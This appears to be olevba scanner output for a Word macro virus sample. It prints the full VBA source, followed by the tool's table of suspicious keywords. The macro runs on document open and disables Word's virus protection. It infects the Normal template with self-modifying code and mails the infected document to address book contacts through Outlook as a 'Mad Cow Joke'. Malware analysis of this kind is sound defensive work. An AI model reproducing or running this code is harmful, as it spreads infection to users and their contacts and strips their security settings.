olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.cn-f854687160d571898e49694bac46656a87d3b26a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.cn-f854687160d571898e49694bac46656a87d3b26a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'joe wells7/17/00 3:48:54 PMgoatClippit
On Error Resume Next
'joe wells7/17/00 3:48:54 PMgoatClippit
Options.VirusProtection = 0 - 0
'joe wells7/17/00 3:48:54 PMgoatClippit
Options.SaveNormalPrompt = 0 - 0
'joe wells7/17/00 3:48:54 PMgoatClippit
Options.ConfirmConversions = 0 - 0
'joe wells7/17/00 3:48:54 PMgoatClippit
nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'joe wells7/17/00 3:48:54 PMgoatClippit
ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'joe wells7/17/00 3:48:54 PMgoatClippit
VSize = 136
'joe wells7/17/00 3:48:54 PMgoatClippit
If nt < VSize - 1 Then
'joe wells7/17/00 3:48:54 PMgoatClippit
    Set Vhost = NormalTemplate.VBProject.VBComponents.Item(1)
'joe wells7/17/00 3:48:54 PMgoatClippit
    Set VSource = ActiveDocument.VBProject.VBComponents.Item(1)
'joe wells7/17/00 3:48:54 PMgoatClippit
    nt = 77
'joe wells7/17/00 3:48:54 PMgoatClippit
    GoTo out
'joe wells7/17/00 3:48:54 PMgoatClippit
End If
'joe wells7/17/00 3:48:54 PMgoatClippit
If ad = 0 Then
'joe wells7/17/00 3:48:54 PMgoatClippit
    Set Vhost = ActiveDocument.VBProject.VBComponents.Item(1)
'joe wells7/17/00 3:48:54 PMgoatClippit
    Set VSource = NormalTemplate.VBProject.VBComponents.Item(1)
'joe wells7/17/00 3:48:54 PMgoatClippit
    GoTo out
'joe wells7/17/00 3:48:54 PMgoatClippit
End If
'joe wells7/17/00 3:48:54 PMgoatClippit
GoTo VMailer
'joe wells7/17/00 3:48:54 PMgoatClippit
out:
'joe wells7/17/00 3:48:54 PMgoatClippit
With Vhost.CodeModule
'joe wells7/17/00 3:48:54 PMgoatClippit
    VSource.Export "c:\v.sys"
'joe wells7/17/00 3:48:54 PMgoatClippit
    .AddFromFile ("c:\v.sys")
'joe wells7/17/00 3:48:54 PMgoatClippit
    For x = 2 To VSize Step 2
'joe wells7/17/00 3:48:54 PMgoatClippit
        .ReplaceLine x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'joe wells7/17/00 3:48:54 PMgoatClippit
    Next x
'joe wells7/17/00 3:48:54 PMgoatClippit
End With
'joe wells7/17/00 3:48:54 PMgoatClippit
For x = 1 To 4
'joe wells7/17/00 3:48:54 PMgoatClippit
     Vhost.CodeModule.deletelines 1
'joe wells7/17/00 3:48:54 PMgoatClippit
Next x
'joe wells7/17/00 3:48:54 PMgoatClippit
Vhost.CodeModule.ReplaceLine 1, "Sub AutoOpen"
'joe wells7/17/00 3:48:54 PMgoatClippit
Vhost.CodeModule.ReplaceLine 131, "Sub ViewVBCode"
'joe wells7/17/00 3:48:54 PMgoatClippit
If nt = 77 Then
'joe wells7/17/00 3:48:54 PMgoatClippit
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 1, "Sub AutoClose"
'joe wells7/17/00 3:48:54 PMgoatClippit
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 131, "Sub ToolsMacro"
'joe wells7/17/00 3:48:54 PMgoatClippit
End If
'joe wells7/17/00 3:48:54 PMgoatClippit
VMailer:
'joe wells7/17/00 3:48:54 PMgoatClippit
If ActiveDocument.Name <> "Madcow" Then
'joe wells7/17/00 3:48:54 PMgoatClippit
    Dim VOutlook, VMapi, VMail
'joe wells7/17/00 3:48:54 PMgoatClippit
    Set VOutlook = CreateObject("Outlook.Application")
'joe wells7/17/00 3:48:54 PMgoatClippit
    Set VMapi = VOutlook.GetNameSpace("MAPI")
'joe wells7/17/00 3:48:54 PMgoatClippit
    If VOutlook = "Outlook" Then
'joe wells7/17/00 3:48:54 PMgoatClippit
    VMapi.Logon "profile", "password"
'joe wells7/17/00 3:48:54 PMgoatClippit
        For y = 1 To VMapi.AddressLists.Count
'joe wells7/17/00 3:48:54 PMgoatClippit
            Set AddyBook = VMapi.AddressLists(y)
'joe wells7/17/00 3:48:54 PMgoatClippit
            x = 1
'joe wells7/17/00 3:48:54 PMgoatClippit
            Set VMail = VOutlook.CreateItem(0)
'joe wells7/17/00 3:48:54 PMgoatClippit
            For oo = 1 To AddyBook.AddressEntries.Count
'joe wells7/17/00 3:48:54 PMgoatClippit
                Peep = AddyBook.AddressEntries(x)
'joe wells7/17/00 3:48:54 PMgoatClippit
                VMail.Recipients.Add Peep
'joe wells7/17/00 3:48:54 PMgoatClippit
                x = x + 1
'joe wells7/17/00 3:48:54 PMgoatClippit
                If x > 20 Then oo = AddyBook.AddressEntries.Count
'joe wells7/17/00 3:48:54 PMgoatClippit
             Next oo
'joe wells7/17/00 3:48:54 PMgoatClippit
             VMail.Subject = "Mad Cow Joke"
'joe wells7/17/00 3:48:54 PMgoatClippit
             VMail.Body = "Beware of the spread of the Madcow Disease"
'joe wells7/17/00 3:48:54 PMgoatClippit
             VMail.Attachments.Add ActiveDocument.FullName
'joe wells7/17/00 3:48:54 PMgoatClippit
             VMail.Send
'joe wells7/17/00 3:48:54 PMgoatClippit
             Peep = ""
'joe wells7/17/00 3:48:54 PMgoatClippit
        Next y
'joe wells7/17/00 3:48:54 PMgoatClippit
    VMapi.Logoff
'joe wells7/17/00 3:48:54 PMgoatClippit
    End If
'joe wells7/17/00 3:48:54 PMgoatClippit
End If
'joe wells7/17/00 3:48:54 PMgoatClippit
VError:
'joe wells7/17/00 3:48:54 PMgoatClippit
End Sub
'joe wells7/17/00 3:48:54 PMgoatClippit
Sub ViewVBCode()
'joe wells7/17/00 3:48:54 PMgoatClippit
End Sub

'WORD/VERONICA // thanks to WORD/MELLISA & WORD/CLASS

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

